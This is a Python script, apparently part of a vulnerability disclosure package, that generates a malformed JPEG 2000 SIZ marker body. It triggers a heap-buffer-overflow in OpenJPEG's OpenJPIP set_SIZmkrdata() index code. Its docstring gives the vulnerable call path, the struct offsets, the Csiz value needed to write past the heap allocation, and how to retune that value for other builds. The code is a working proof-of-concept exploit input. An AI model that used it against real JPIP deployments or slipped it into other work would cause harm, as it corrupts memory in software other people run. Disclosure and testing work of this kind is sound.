#!/usr/bin/env python3
"""
PoC generator for: heap-buffer-overflow in OpenJPEG OpenJPIP
set_SIZmkrdata() (src/lib/openjpip/index_manager.c)

Same root cause as get_SIZmkrdata_from_j2kstream() (see the
openjpip_get_sizmkrdata_j2kstream/ evidence package): an
attacker-controlled, unvalidated 2-byte Csiz field drives a write loop
into the fixed 3-element SIZ.Ssiz/XRsiz/YRsiz arrays. set_SIZmkrdata()
is the JPIP *index* (cidx/mhix box) code path -- reached from
parse_jp2file() -> set_cidxdata() -> set_mainmhixdata(), i.e. the
exported get_index_from_JP2file() JPIP entry point -- rather than the
raw-codestream path, and here SIZ lives inside a HEAP-allocated
index_param_t (opj_malloc(sizeof(index_param_t)) in parse_jp2file()),
so the same missing bound turns into a heap-buffer-overflow instead of
a stack-buffer-overflow.

index_param_t is 144 bytes and SIZ.Ssiz starts at byte offset 78 in this
build, so Csiz must exceed roughly 66 to write past the end of the
heap allocation (not just past the logical Ssiz[3]/XRsiz[3]/YRsiz[3]
capacity) -- this PoC uses Csiz=100 for a comfortable margin. (The
exact offset is compiler/struct-layout dependent; the generator exposes
Csiz as a parameter so it can be re-tuned against a different build if
needed -- the underlying missing-bound-check bug is not layout
dependent.)

NOTE: under the project's default combined -fsanitize=address,undefined
build, UBSan's runtime array-bounds check on `Ssiz[3]` fires first at
i==3 (a logical bounds violation, not by itself in-scope memory
corruption). See build.txt: an ASan-only build is used to reach and
prove the real heap-buffer-overflow past that point.

Output: siz_marker_body.bin - raw bytes for the SIZ marker BODY (the
Lsiz field onward; set_SIZmkrdata() does not consume/check the 0xFF51
marker-code bytes themselves, see index_manager.c:633-670).
"""
import struct
import sys


def build(csiz: int) -> bytes:
    xsiz, ysiz = 100, 100
    xtsiz, ytsiz = 100, 100

    body = bytearray()
    body += struct.pack(">H", 0)          # Lsiz placeholder, fixed below
    body += struct.pack(">H", 0)          # Rsiz
    body += struct.pack(">I", xsiz)       # Xsiz
    body += struct.pack(">I", ysiz)       # Ysiz
    body += struct.pack(">I", 0)          # XOsiz
    body += struct.pack(">I", 0)          # YOsiz
    body += struct.pack(">I", xtsiz)      # XTsiz
    body += struct.pack(">I", ytsiz)      # YTsiz
    body += struct.pack(">I", 0)          # XTOsiz
    body += struct.pack(">I", 0)          # YTOsiz
    body += struct.pack(">H", csiz)       # Csiz - attacker controlled
    for c in range(csiz):
        body += bytes([1, 1, 1])          # Ssiz=1bpp, XRsiz=1, YRsiz=1

    lsiz = len(body)
    body[0:2] = struct.pack(">H", lsiz)
    return bytes(body)


if __name__ == "__main__":
    csiz = int(sys.argv[1]) if len(sys.argv) > 1 else 100
    outfile = sys.argv[2] if len(sys.argv) > 2 else "siz_marker_body.bin"
    data = build(csiz)
    with open(outfile, "wb") as f:
        f.write(data)
    print(f"wrote {outfile}: {len(data)} bytes, Csiz={csiz}")
